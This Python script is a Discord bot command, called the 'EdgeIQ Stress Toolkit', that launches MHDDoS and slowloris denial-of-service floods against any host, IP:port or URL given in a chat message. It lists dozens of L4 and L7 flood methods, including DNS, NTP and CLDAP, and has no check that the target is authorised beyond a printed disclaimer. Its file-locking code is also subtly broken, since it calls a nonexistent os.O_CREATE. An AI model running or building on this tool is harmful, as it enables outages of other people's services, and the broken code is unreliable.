#!/usr/bin/env python3
"""
Discord wrapper for MHDDoS and slowloris stress-testing tools.
State persisted to JSON so status/stop work across invocations.
Run via: python3 discord_stress_command.py '<message>'
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any

# Paths
APP_DIR = Path(__file__).resolve().parent
MHDDoS_DIR = APP_DIR / "MHDDoS"
MHDDoS_START = MHDDoS_DIR / "start.py"
VENV_PY = APP_DIR / "venv" / "bin" / "python3"
STATE_FILE = APP_DIR / ".attack_state.json"
LOCK_FILE = APP_DIR / ".attack.lock"

DISCORD_LIMIT = 1900

METHODS_L4 = {
    "TCP", "UDP", "SYN", "ICMP", "MEM", "MCPE", "NTP", "DNS", "RDP",
    "CHAR", "OVH-UDP", "VSE", "TS3", "CPS", "CONNECTION", "ARD", "FIVEM",
    "CLDAP", "MINECRAFT", "MCBOT",
}
METHODS_L7 = {
    "GET", "POST", "HEAD", "SLOW", "STOMP", "DYN", "NULL", "COOKIE",
    "CFB", "CFBUAM", "AVB", "BOT", "APACHE", "XMLRPC", "BYPASS", "DGB",
    "DOWNLOADER", "GAMING", "RHEX", "STRESS", "EVEN", "KILLER", "PPS",
    "TOR", "BOMB", "OVH", "GSB",
}
ALL_METHODS = METHODS_L4 | METHODS_L7


# ─── Persistent state ───────────────────────────────────────────────────────


def _read_state() -> dict[str, dict]:
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}


def _write_state(state: dict[str, dict]) -> None:
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2)


def _acquire_lock() -> bool:
    """Acquire a simple file lock."""
    try:
        fd = os.open(str(LOCK_FILE), os.O_CREATE | os.O_EXCL | os.O_WRONLY)
        os.close(fd)
        return True
    except FileExistsError:
        return False


def _release_lock() -> None:
    try:
        os.remove(LOCK_FILE)
    except FileNotFoundError:
        pass


def _update_attack(attack_id: str, patch: dict) -> None:
    """Update attack state atomically."""
    while not _acquire_lock():
        time.sleep(0.1)
    try:
        state = _read_state()
        if attack_id in state:
            state[attack_id].update(patch)
            _write_state(state)
    finally:
        _release_lock()


# ─── Subprocess attack runners ──────────────────────────────────────────────


def _run_mhddoos(cmd: list, attack_id: str, target: str, method: str) -> None:
    """Run MHDDoS in a subprocess, streaming output to state file."""
    proc = None
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            cwd=str(MHDDoS_DIR),
        )
        _update_attack(attack_id, {"status": "running", "proc_pid": proc.pid})

        for line in proc.stdout:
            line = line.strip()
            if line and len(line) < 500:
                _update_attack(attack_id, {"last_output": line})

        proc.wait()
        _update_attack(attack_id, {"status": "finished", "ended_at": time.time()})
    except Exception as e:
        _update_attack(attack_id, {"status": "error", "error": str(e)})
    finally:
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                pass


def _run_slowloris(cmd: list, attack_id: str, target: str) -> None:
    """Run slowloris in a subprocess."""
    proc = None
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        _update_attack(attack_id, {"status": "running", "proc_pid": proc.pid})

        for line in proc.stdout:
            line = line.strip()
            if line and len(line) < 500:
                _update_attack(attack_id, {"last_output": line})

        proc.wait()
        _update_attack(attack_id, {"status": "finished", "ended_at": time.time()})
    except Exception as e:
        _update_attack(attack_id, {"status": "error", "error": str(e)})
    finally:
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                pass


# ─── Attack lifecycle ─────────────────────────────────────────────────────────


def start_mhddoos(method: str, target_info: dict, threads: int,
                  duration: int, socks_type: str = "0", proxy_file: str = "") -> tuple[str, str]:
    attack_id = f"mh-{int(time.time())}"
    method = method.upper()

    if target_info["type"] == "L4":
        cmd = [
            str(VENV_PY), str(MHDDoS_START),
            method,
            f"{target_info['host']}:{target_info['port']}",
            str(threads),
            str(duration),
        ]
        target_display = f"L4 {method} → {target_info['host']}:{target_info['port']}"
    else:
        cmd = [
            str(VENV_PY), str(MHDDoS_START),
            method,
            target_info["url"],
            socks_type,
            str(threads),
            proxy_file,
            "100",
            str(duration),
        ]
        target_display = f"L7 {method} → {target_info['url']}"

    state = _read_state()
    state[attack_id] = {
        "type": "mhddoos",
        "method": method,
        "target": target_display,
        "threads": threads,
        "duration": duration,
        "status": "starting",
        "started_at": time.time(),
        "last_output": "",
        "proc_pid": None,
    }
    _write_state(state)

    t = threading.Thread(
        target=_run_mhddoos,
        args=(cmd, attack_id, target_display, method),
        daemon=True,
    )
    t.start()
    return attack_id, target_display


def start_slowloris(host: str, port: int, sockets: int, duration: int) -> tuple[str, str]:
    attack_id = f"sl-{int(time.time())}"
    target_display = f"slowloris → {host}:{port}"

    cmd = [
        str(VENV_PY), "-m", "slowloris",
        host,
        "-p", str(port),
        "-s", str(sockets),
        "--timeout", str(duration),
    ]

    state = _read_state()
    state[attack_id] = {
        "type": "slowloris",
        "target": target_display,
        "sockets": sockets,
        "status": "starting",
        "started_at": time.time(),
        "last_output": "",
        "proc_pid": None,
    }
    _write_state(state)

    t = threading.Thread(
        target=_run_slowloris,
        args=(cmd, attack_id, target_display),
        daemon=True,
    )
    t.start()
    return attack_id, target_display


def stop_attack(attack_id: str) -> str:
    state = _read_state()
    if attack_id not in state:
        return f"Attack `{attack_id}` not found."
    info = state[attack_id]
    if info["status"] not in ("running", "starting"):
        return f"Attack `{attack_id}` is `{info['status']}`, cannot stop."

    pid = info.get("proc_pid")
    if pid:
        try:
            os.kill(pid, 15)  # SIGTERM
            time.sleep(1)
            try:
                os.kill(pid, 9)  # SIGKILL if still alive
            except OSError:
                pass
        except OSError:
            pass

    info["status"] = "stopped"
    info["ended_at"] = time.time()
    state[attack_id] = info
    _write_state(state)
    return f"⏹ Stopped `{attack_id}` — {info['target']}"


def list_attacks() -> str:
    state = _read_state()
    if not state:
        return "No active or recent attacks."
    lines = ["**EdgeIQ Stress Toolkit — Active/Recent Attacks**\n"]
    for aid, info in sorted(state.items(), key=lambda x: x[1].get("started_at", 0), reverse=True):
        elapsed = int(time.time() - info.get("started_at", 0))
        status_map = {"running": "🟢", "starting": "🟡", "finished": "✅", "stopped": "⏹", "error": "❌"}
        emoji = status_map.get(info.get("status", ""), "❔")
        lines.append(f"{emoji} `{aid}` — {info.get('target','?')} — {info.get('status','?')} ({elapsed}s ago)")
        if info.get("last_output"):
            lines.append(f"   └ {info['last_output'][:120]}")
    return "\n".join(lines)


def get_status(attack_id: str) -> str:
    state = _read_state()
    if attack_id not in state:
        return f"Attack `{attack_id}` not found."
    info = state[attack_id]
    elapsed = int(time.time() - info.get("started_at", 0))
    lines = [
        f"**{info.get('target', '?')}**",
        f"Type: `{info.get('type','?')}` | Method: `{info.get('method', info.get('type','?'))}`",
        f"Status: `{info.get('status','?')}` | Elapsed: {elapsed}s",
    ]
    if info.get("last_output"):
        lines.append(f"\nLast output: `{info['last_output'][:200]}`")
    return "\n".join(lines)


# ─── Target parser ───────────────────────────────────────────────────────────


def parse_target(target: str) -> dict[str, Any]:
    target = target.strip()
    if re.match(r"^[\w.-]+:\d+$", target):
        parts = target.rsplit(":", 1)
        return {"type": "L4", "host": parts[0], "port": int(parts[1]), "url": None}
    if target.startswith("http"):
        return {"type": "L7", "url": target, "host": None, "port": None}
    return {"type": "L7", "url": f"https://{target}", "host": None, "port": None}


# ─── Message router ──────────────────────────────────────────────────────────


def run_from_message(message: str) -> str:
    parts = message.strip().split()
    if not parts or parts[0] not in ("!stress", "/stress"):
        raise ValueError("Must start with !stress")

    args = parts[1:]

    if not args or args[0] in ("help", "-h", "--help"):
        return (
            "**EdgeIQ Stress Toolkit**\n\n"
            "**Generic:** `!stress <method> <target> [threads] [duration]`\n"
            "**Quick-start:**\n"
            "  `!stress slowloris <host> [port=80] [sockets=200] [duration=300]`\n"
            "  `!stress httpflood <url> [threads=100] [duration=300]`\n"
            "  `!stress dnsflood <ip:port> [threads=100] [duration=300]`\n"
            "**Management:**\n"
            "  `!stress list` — list active/recent attacks\n"
            "  `!stress status <id>` — status of specific attack\n"
            "  `!stress stop <id>` — stop an attack\n"
            "  `!stress methods` — list all methods\n\n"
            "**L4 targets:** `IP:port` | **L7 targets:** `https://example.com`"
        )

    sub = args[0].lower()

    if sub == "list":
        return list_attacks()

    if sub == "stop":
        if len(args) < 2:
            return "**Usage:** `!stress stop <attack_id>`"
        return stop_attack(args[1])

    if sub == "status":
        if len(args) < 2:
            return "**Usage:** `!stress status <attack_id>`"
        return get_status(args[1])

    if sub == "methods":
        return (
            f"**L4 Methods ({len(METHODS_L4)}):**\n`{'`, `'.join(sorted(METHODS_L4))}`\n\n"
            f"**L7 Methods ({len(METHODS_L7)}):**\n`{'`, `'.join(sorted(METHODS_L7))}`"
        )

    # Quick-start: slowloris
    if sub == "slowloris":
        if len(args) < 2:
            return "**Usage:** `!stress slowloris <host> [port] [sockets] [duration]`"
        host = args[1]
        port = int(args[2]) if len(args) > 2 else 80
        sockets = int(args[3]) if len(args) > 3 else 200
        duration = int(args[4]) if len(args) > 4 else 300
        attack_id, target_display = start_slowloris(host, port, sockets, duration)
        return (
            f"**🚀 Slowloris attack started**\n"
            f"Target: `{target_display}`\n"
            f"Sockets: {sockets} | Duration: {duration}s\n"
            f"Attack ID: `{attack_id}`\n\n"
            f"Status: `!stress status {attack_id}`\n"
            f"Stop: `!stress stop {attack_id}`\n\n"
            f"⚠️ Authorized testing only."
        )

    # Quick-start: HTTP flood
    if sub == "httpflood":
        if len(args) < 2:
            return "**Usage:** `!stress httpflood <url> [threads] [duration]`"
        target = args[1]
        threads = int(args[2]) if len(args) > 2 else 100
        duration = int(args[3]) if len(args) > 3 else 300
        ti = parse_target(target)
        method = "GET"
        attack_id, td = start_mhddoos(method, ti, threads, duration)
        return _fmt_start(attack_id, td, method, threads, duration)

    # Quick-start: DNS flood
    if sub == "dnsflood":
        if len(args) < 2:
            return "**Usage:** `!stress dnsflood <ip:port> [threads] [duration]`"
        target = args[1]
        threads = int(args[2]) if len(args) > 2 else 100
        duration = int(args[3]) if len(args) > 3 else 300
        ti = parse_target(target)
        if ti["type"] != "L4":
            return "DNS flood requires L4 target (IP:port)"
        attack_id, td = start_mhddoos("DNS", ti, threads, duration)
        return _fmt_start(attack_id, td, "DNS", threads, duration)

    # Generic MHDDoS
    method = args[0].upper()
    if method not in ALL_METHODS:
        return (
            f"Unknown method `{method}`. Run `!stress methods` for the list.\n"
            "Quick-start: `!stress slowloris`, `!stress httpflood`, `!stress dnsflood`"
        )

    if len(args) < 2:
        return f"**Usage:** `!stress {method.lower()} <target> [threads] [duration]`"

    target = args[1]
    threads = int(args[2]) if len(args) > 2 else 100
    duration = int(args[3]) if len(args) > 3 else 300
    ti = parse_target(target)

    if method in METHODS_L4 and ti["type"] != "L4":
        return f"Method `{method}` is L4 — give IP:port (e.g. `1.2.3.4:80`)"
    if method in METHODS_L7 and ti["type"] != "L7":
        return f"Method `{method}` is L7 — give URL (e.g. `https://example.com`)"

    attack_id, td = start_mhddoos(method, ti, threads, duration)
    return _fmt_start(attack_id, td, method, threads, duration)


def _fmt_start(attack_id: str, target_display: str, method: str, threads: int, duration: int) -> str:
    return (
        f"**🚀 Attack started**\n"
        f"Target: `{target_display}`\n"
        f"Method: `{method}` | Threads: {threads} | Duration: {duration}s\n"
        f"Attack ID: `{attack_id}`\n\n"
        f"Status: `!stress status {attack_id}`\n"
        f"Stop: `!stress stop {attack_id}`\n\n"
        f"⚠️ Authorized testing only."
    )


# ─── CLI entry point ─────────────────────────────────────────────────────────


def main() -> int:
    if len(sys.argv) < 2:
        print("Usage: discord_stress_command.py '!stress <args>'")
        return 2
    try:
        print(run_from_message(" ".join(sys.argv[1:])))
        return 0
    except Exception as e:
        print(f"Error: {e}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
